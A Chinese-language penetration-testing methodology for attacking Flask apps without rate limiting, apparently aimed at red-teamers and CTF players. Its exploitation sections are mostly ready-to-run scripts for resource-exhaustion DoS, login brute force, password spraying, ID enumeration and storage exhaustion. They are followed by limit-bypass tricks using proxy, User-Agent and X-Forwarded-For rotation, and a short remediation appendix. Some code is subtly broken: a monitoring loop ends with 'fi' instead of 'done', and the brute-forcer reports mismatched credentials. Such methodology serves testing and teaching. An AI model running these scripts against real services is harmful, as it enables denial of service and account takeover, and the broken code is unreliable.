# Flask 无速率限制 DoS 攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套系统化的方法论，用于检测和利用 Flask 应用缺乏速率限制机制的漏洞，实现资源耗尽攻击（DoS）、暴力破解凭证、数据枚举等攻击目标。

## 1.2 适用范围

本文档适用于以下类型的应用：
- Flask 框架开发且无速率限制的 Web 应用
- 登录接口、文件上传/下载、API 调用无频率限制的系统
- CTF 挑战应用、内部工具、演示系统
- 使用 PhantomJS 等资源密集型操作的端点

## 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 进行红队演练的安全分析师
- CTF 参赛选手

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

速率限制（Rate Limiting）是一种防御机制，用于限制用户在特定时间内可以执行的请求次数。当 Flask 应用缺乏速率限制时，攻击者可以：
- 自动化执行大量请求导致资源耗尽（DoS）
- 暴力破解登录凭证
- 枚举敏感数据（用户 ID、订单号等）
- 滥用业务功能（文件上传/下载、验证码发送等）

**本质特征**：
- 无请求频率监控
- 无 IP/会话级别限制
- 无 CAPTCHA 等人机验证
- 无账户锁定机制
- 无并发请求限制

### Flask 应用典型架构风险

```
外部用户 (Internet)
       │
       ▼
┌──────────────────┐
│   Flask 应用     │  无速率限制中间件
│   (Port 5000)    │  无 IP 追踪逻辑
└────────┬─────────┘  无请求计数器
         │
         │ 每个请求触发高资源操作
         ▼
┌──────────────────┐
│   PhantomJS      │  每请求启动新进程
│   进程池          │  CPU/内存密集型
└──────────────────┘
```

### 典型风险端点

| 端点类型 | 功能示例 | 资源消耗 | 攻击影响 |
|---------|---------|---------|---------|
| **XSS 验证端点** | `/page?url=` | PhantomJS 进程（~50MB/进程） | CPU/内存耗尽 |
| **登录接口** | `/login` | 数据库查询、密码哈希 | 凭证暴力破解 |
| **文件上传** | `/upload` | 磁盘 I/O、存储 | 存储耗尽 |
| **文件下载** | `/download` | 磁盘 I/O、带宽 | 带宽耗尽 |
| **API 调用** | `/api/*` | 数据库查询、业务逻辑 | 数据枚举、服务过载 |
| **密码重置** | `/reset-password` | 邮件发送、数据库更新 | 邮件轰炸、DoS |

## 2.2 攻击常见于哪些业务场景

### 2.2.1 CTF XSS 挑战应用

**场景描述**：CTF 挑战应用使用 PhantomJS 验证 XSS，每个请求启动新的 PhantomJS 进程。

**案例分析**：

```python
# 典型无速率限制代码
@app.route('/page')
def xss_challenge():
    msg = request.args.get('url', '')
    
    # 无速率限制检查
    # 无 IP 追踪
    # 无请求计数器
    
    # 每个请求启动新的 PhantomJS 进程
    proc = subprocess.Popen(["timeout", "5", "phantomjs", "check.js"],
                            stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    
    # 无进程池、无并发限制
```

**风险点**：
- 每个请求消耗 ~50MB 内存
- 每个请求占用 1 个 CPU 核心（5 秒）
- 100 并发请求 = 5GB 内存 + 100 CPU 核心

### 2.2.2 文件上传服务

**场景描述**：文件上传端点无上传频率限制。

**案例分析**：

```python
# 典型无速率限制上传
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    
    # 无上传频率检查
    # 无存储配额检查
    # 无文件大小限制
    
    file.save(f'/app/uploads/{file.filename}')
    # 直接保存，无限制
```

**风险点**：
- 1000 次上传 × 1MB = 1GB 存储
- 并发上传消耗磁盘 I/O
- 可能导致存储耗尽

### 2.2.3 登录接口

**场景描述**：登录接口无失败次数限制。

**案例分析**：

```python
# 典型无速率限制登录
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # 无失败次数计数
    # 无 IP 封禁逻辑
    # 无账户锁定机制
    
    user = db.query("SELECT * FROM users WHERE username=?", username)
    if user and check_password(password, user.password):
        return "Login successful"
    else:
        return "Login failed"
```

**风险点**：
- 无限尝试密码
- 弱密码可被快速破解
- 管理员账户风险最高

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

#### 步骤 1：基准测试

```bash
# 发送单个请求，记录响应
curl -X POST http://localhost:43647/page \
  -d "url=test" \
  -v

# 记录响应时间、状态码、响应头
# Status: 200 OK
# X-RateLimit-Limit: (如有，说明有限制)
# Retry-After: (如有，说明有限制)
```

#### 步骤 2：连续请求测试

```bash
# 发送 10 个连续请求
for i in {1..10}; do
  curl -s -o /dev/null -w "Request $i: HTTP %{http_code} (%{time_total}s)\n" \
    "http://localhost:43647/page?url=test"
done

# 观察：
# - 所有请求是否都返回 200？
# - 响应时间是否稳定？
# - 是否有 429 Too Many Requests？
# - 是否有 IP 封禁？
```

#### 步骤 3：高频并发测试

```bash
# 使用并发请求测试
echo "Starting 50 concurrent requests..."
START=$(date +%s)

for i in {1..50}; do
  curl -s -o /dev/null \
    "http://localhost:43647/page?url=test" &
done
wait

END=$(date +%s)
DURATION=$((END - START))

echo "Completed 50 requests in $DURATION seconds"
echo "Requests per second: $(echo "scale=2; 50/$DURATION" | bc)"
```

#### 步骤 4：大规模并发测试

```bash
# 100 并发测试
echo "Starting 100 concurrent requests..."
START=$(date +%s)

for i in {1..100}; do
  curl -s -o /dev/null \
    "http://localhost:43647/page?url=test" &
done
wait

END=$(date +%s)
DURATION=$((END - START))

echo "Completed 100 requests in $DURATION seconds"
echo "Requests per second: $(echo "scale=2; 100/$DURATION" | bc)"

# 观察服务器状态：
# - 是否出现错误（502/503/504）？
# - 响应时间是否显著增加？
# - 内存/CPU 使用率是否飙升？
```

#### 步骤 5：资源消耗评估

```bash
# 监控服务器资源（需要服务器访问权限）
# 或在本地测试时监控本地资源

# 使用 htop 监控进程
htop -p $(pgrep -f phantomjs)

# 监控内存使用
watch -n 1 'ps aux | grep phantomjs | awk "{sum+=$6} END {print sum/1024, "MB"}"'

# 监控进程数量
watch -n 1 'pgrep -f phantomjs | wc -l'
```

### 2.3.2 白盒测试

**代码审计要点**：

```python
# ❌ 危险模式：无任何速率限制

# 模式 1：无中间件、无装饰器
@app.route('/page')
def xss_challenge():
    # 无 rate limit 检查
    # 无 IP 追踪
    pass

# 模式 2：无 Flask-Limiter 配置
# requirements.txt 中无 flask-limiter
# 代码中无 @limiter.limit 装饰器

# 模式 3：无请求计数器
# 无 Redis/Memcached 计数
# 无内存计数器

# ✅ 安全模式：多层速率限制
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    storage_uri="memory://"
)

@app.route('/page')
@limiter.limit("10 per minute")
def xss_challenge():
    # 每分钟最多 10 次请求
    pass
```

**框架配置检测**：

```bash
# 搜索速率限制相关代码
grep -r "flask-limiter" /path/to/code/
grep -r "@limiter.limit" /path/to/code/
grep -r "rate_limit" /path/to/code/

# 搜索计数器/缓存
grep -r "Redis::incr" /path/to/code/
grep -r "from redis" /path/to/code/

# 搜索 IP 追踪
grep -r "request.remote_addr" /path/to/code/
grep -r "get_remote_address" /path/to/code/
```

## 2.4 漏洞利用方法

### 2.4.1 资源耗尽攻击（DoS）

#### 2.4.1.1 PhantomJS 进程耗尽

**场景**：每个请求启动新的 PhantomJS 进程。

```bash
#!/bin/bash
# PhantomJS 进程耗尽攻击脚本

TARGET_URL="http://localhost:43647/page"
NUM_REQUESTS=200

echo "Target: $TARGET_URL"
echo "Requests: $NUM_REQUESTS"
echo "=========================================="

START=$(date +%s)

# 并发启动所有请求
for i in $(seq 1 $NUM_REQUESTS); do
  curl -s -o /dev/null "$TARGET_URL?url=test" &
  
  # 每 10 个请求显示进度
  if [ $((i % 10)) -eq 0 ]; then
    echo "Sent $i/$NUM_REQUESTS requests..."
  fi
done

# 等待所有请求完成
wait

END=$(date +%s)
DURATION=$((END - START))

echo "=========================================="
echo "Completed $NUM_REQUESTS requests in $DURATION seconds"
echo "Requests per second: $(echo "scale=2; $NUM_REQUESTS/$DURATION" | bc)"

# 评估影响：
# - 200 个 PhantomJS 进程 × 50MB = 10GB 内存
# - 200 个进程 × 5 秒 = 1000 CPU-秒
```

#### 2.4.1.2 内存耗尽攻击

```bash
#!/bin/bash
# 内存耗尽攻击脚本

TARGET_URL="http://localhost:43647/page"

echo "Starting memory exhaustion attack..."
echo "Monitoring memory usage..."

# 后台监控内存
(
  while true; do
    MEM=$(ps aux | grep phantomjs | awk '{sum+=$6} END {print sum/1024/1024}')
    echo "[$(date +%H:%M:%S)] PhantomJS memory: ${MEM}GB"
    sleep 1
  fi
) &

MONITOR_PID=$!

# 发送请求
for i in {1..500}; do
  curl -s -o /dev/null "$TARGET_URL?url=test" &
  
  if [ $((i % 50)) -eq 0 ]; then
    echo "Sent $i requests..."
  fi
done

wait

# 停止监控
kill $MONITOR_PID

echo "Attack completed"
```

### 2.4.2 暴力破解攻击

#### 2.4.2.1 登录暴力破解

```bash
#!/usr/bin/env python3
"""
Flask 登录暴力破解脚本
"""

import requests
import concurrent.futures

TARGET_URL = "http://localhost:43647/login"
USERNAMES = ["admin", "administrator", "root", "user"]
PASSWORDS = ["password", "123456", "admin", "letmein", "welcome", "123456789"]

def try_login(username, password):
    """
    尝试登录
    """
    data = {"username": username, "password": password}
    response = requests.post(TARGET_URL, data=data)
    
    if response.status_code == 200:
        if "welcome" in response.text.lower() or "success" in response.text.lower():
            return True
    return False

def bruteforce():
    print(f"Target: {TARGET_URL}")
    print("=" * 60)
    
    success_count = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        
        for username in USERNAMES:
            for password in PASSWORDS:
                futures.append(executor.submit(try_login, username, password))
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            if future.result():
                print(f"[+] SUCCESS: {USERNAMES[i//len(PASSWORDS)]}:{PASSWORDS[i%len(PASSWORDS)]}")
                success_count += 1
    
    print("=" * 60)
    print(f"Successful logins: {success_count}")

if __name__ == '__main__':
    bruteforce()
```

#### 2.4.2.2 密码喷洒攻击

```bash
#!/bin/bash
# 密码喷洒攻击脚本

TARGET_URL="http://localhost:43647/login"
PASSWORD="Password123"

# 用户列表
USERNAMES=(
  "admin"
  "administrator"
  "root"
  "user1"
  "user2"
  "test"
)

echo "Starting password spraying attack..."
echo "Password: $PASSWORD"
echo "=========================================="

for username in "${USERNAMES[@]}"; do
  RESPONSE=$(curl -s -X POST "$TARGET_URL" \
    -d "username=$username&password=$PASSWORD")
  
  if echo "$RESPONSE" | grep -qi "welcome\|success"; then
    echo "[+] SUCCESS: $username:$PASSWORD"
  else
    echo "[-] FAILED: $username"
  fi
  
  # 延迟避免触发潜在限制
  sleep 0.5
done

echo "=========================================="
echo "Password spraying completed"
```

### 2.4.3 数据枚举攻击

#### 2.4.3.1 用户 ID 枚举

```bash
#!/usr/bin/env python3
"""
用户 ID 枚举脚本
"""

import requests

TARGET_URL = "http://localhost:43647/api/users/"

print("Enumerating user IDs...")
print("=" * 60)

found_users = []

for user_id in range(1, 10001):
    response = requests.get(f"{TARGET_URL}{user_id}")
    
    if response.status_code == 200:
        try:
            user_data = response.json()
            print(f"[+] User {user_id}: {user_data}")
            found_users.append((user_id, user_data))
        except:
            print(f"[+] User {user_id}: (non-JSON response)")
            found_users.append((user_id, None))
    elif response.status_code == 429:
        print(f"[-] Rate limited at ID {user_id}")
        break
    elif response.status_code == 404:
        pass  # User not found
    else:
        print(f"[?] ID {user_id}: Status {response.status_code}")

print("=" * 60)
print(f"Enumeration completed. Found {len(found_users)} users.")
```

#### 2.4.3.2 订单号枚举

```bash
#!/bin/bash
# 订单号枚举脚本

TARGET_URL="http://localhost:43647/api/orders/"

echo "Enumerating order IDs..."
echo "=========================================="

for order_id in $(seq 1 10000); do
  RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$order_id")
  HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
  BODY=$(echo "$RESPONSE" | head -n-1)
  
  if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] Order $order_id: $BODY"
  elif [ "$HTTP_CODE" = "429" ]; then
    echo "[-] Rate limited at order $order_id"
    break
  fi
done

echo "=========================================="
echo "Enumeration completed"
```

### 2.4.4 文件上传滥用

#### 2.4.4.1 存储耗尽攻击

```bash
#!/usr/bin/env python3
"""
文件上传存储耗尽攻击脚本
"""

import requests
import time
from io import BytesIO

TARGET_URL = "http://localhost:43647/upload"
NUM_UPLOADS = 1000
FILE_SIZE = 1024  # 1KB

print(f"Target: {TARGET_URL}")
print(f"Uploads: {NUM_UPLOADS}")
print(f"File size: {FILE_SIZE} bytes")
print("=" * 60)

success_count = 0
fail_count = 0
start_time = time.time()

for i in range(1, NUM_UPLOADS + 1):
    file_content = f"Storage bomb - upload #{i}".encode()
    files = {'file': (f'upload_{i}.txt', BytesIO(file_content))}
    
    response = requests.post(TARGET_URL, files=files)
    
    if response.status_code == 200:
        success_count += 1
    else:
        fail_count += 1
    
    if i % 100 == 0:
        elapsed = time.time() - start_time
        print(f"Upload #{i}: {success_count} success, {fail_count} failed, {elapsed:.2f}s elapsed")

total_time = time.time() - start_time
total_size = NUM_UPLOADS * FILE_SIZE

print("=" * 60)
print(f"Total uploads: {NUM_UPLOADS}")
print(f"Successful: {success_count}")
print(f"Failed: {fail_count}")
print(f"Duration: {total_time:.2f} seconds")
print(f"Uploads/second: {NUM_UPLOADS/total_time:.2f}")
print(f"Total data uploaded: {total_size / 1024 / 1024:.2f} MB")
print("=" * 60)

if fail_count == 0:
    print("VULNERABILITY: No rate limiting detected!")
    print("An attacker could perform unlimited rapid uploads")
    print("leading to storage exhaustion attacks.")
```

### 2.4.5 完整攻击链

```
1. 信息收集
   ├── 确认 Flask 应用（Server: Werkzeug）
   ├── 确认无速率限制（连续请求测试）
   └── 识别高资源端点（PhantomJS、文件操作）

2. 漏洞验证
   ├── 发送 10 个连续请求
   ├── 确认所有请求成功
   └── 确认无 429 响应

3. 资源评估
   ├── 测量单请求资源消耗
   ├── 计算服务器容量
   └── 规划攻击规模

4. 攻击执行
   ├── 选择攻击类型（DoS/暴力破解/枚举）
   ├── 构造攻击脚本
   └── 执行攻击

5. 影响评估
   ├── 记录攻击效果
   ├── 评估业务影响
   └── 生成报告
```

## 2.5 漏洞利用绕过方法

### 2.5.1 基础速率限制绕过

#### 2.5.1.1 IP 轮换

```bash
# 使用代理池
PROXIES=(
  "http://proxy1:8080"
  "http://proxy2:8080"
  "http://proxy3:8080"
)

for i in {1..100}; do
  PROXY=${PROXIES[$((i % ${#PROXIES[@]}))]}
  curl -x "$PROXY" "http://localhost:43647/page?url=test"
done
```

#### 2.5.1.2 User-Agent 轮换

```bash
# User-Agent 列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

for i in {1..100}; do
  UA=${USER_AGENTS[$((i % ${#USER_AGENTS[@]}))]}
  curl -A "$UA" "http://localhost:43647/page?url=test"
done
```

#### 2.5.1.3 X-Forwarded-For 伪造

```bash
# 伪造客户端 IP
for i in {1..100}; do
  curl -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    "http://localhost:43647/page?url=test"
done
```

---

# 第三部分：附录

## 3.1 速率限制测试清单

| **检测项** | **检测方法** | **无限制特征** |
| :--- | :--- | :--- |
| 登录接口 | 连续 100 次登录尝试 | 全部成功，无 429 |
| XSS 验证端点 | 连续 50 次请求 | 全部成功，无延迟 |
| 文件上传 | 连续 50 次上传 | 全部成功，无节流 |
| API 调用 | 并发 100 个请求 | 全部成功，无拒绝 |
| 密码重置 | 连续 20 次请求 | 全部发送，无限制 |

## 3.2 业务影响评估公式

```
资源耗尽影响（PhantomJS）：
  内存消耗 = 并发请求数 × 单进程内存
  示例：200 请求 × 50MB = 10GB

  CPU 消耗 = 并发请求数 × 单请求 CPU 时间
  示例：200 请求 × 5 秒 = 1000 CPU-秒

存储耗尽影响：
  总存储 = 单次上传大小 × 上传频率 × 时间
  示例：1MB × 100 次/秒 × 3600 秒 = 360GB/小时

带宽耗尽影响：
  总带宽 = 单次下载大小 × 下载频率 × 时间
  示例：10MB × 50 次/秒 × 3600 秒 = 1.8TB/小时
```

## 3.3 修复建议

### Flask-Limiter 配置

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# 配置速率限制
limiter = Limiter(
    app,
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",  # 使用 Redis 存储计数
    default_limits=["100 per hour", "10 per minute"]
)

# 特定端点限制
@app.route('/page')
@limiter.limit("5 per minute")
def xss_challenge():
    pass

@app.route('/login', methods=['POST'])
@limiter.limit("10 per hour")
def login():
    pass
```

### 自定义速率限制

```python
from functools import wraps
from flask import request, abort
import time
from collections import defaultdict

# 简单的内存计数器（生产环境应使用 Redis）
request_counts = defaultdict(list)

def rate_limit(max_requests, window_seconds):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            
            # 清理过期记录
            request_counts[ip] = [
                t for t in request_counts[ip]
                if now - t < window_seconds
            ]
            
            # 检查是否超限
            if len(request_counts[ip]) >= max_requests:
                abort(429)
            
            # 记录请求
            request_counts[ip].append(now)
            
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/page')
@rate_limit(max_requests=5, window_seconds=60)
def xss_challenge():
    pass
```

---

**参考资源**：
- [OWASP Testing Guide: Rate Limiting](https://owasp.org/www-project-web-security-testing-guide/)
- [Flask-Limiter Documentation](https://flask-limiter.readthedocs.io/)
- [PortSwigger - Rate Limiting](https://portswigger.net/web-security/rate-limiting)
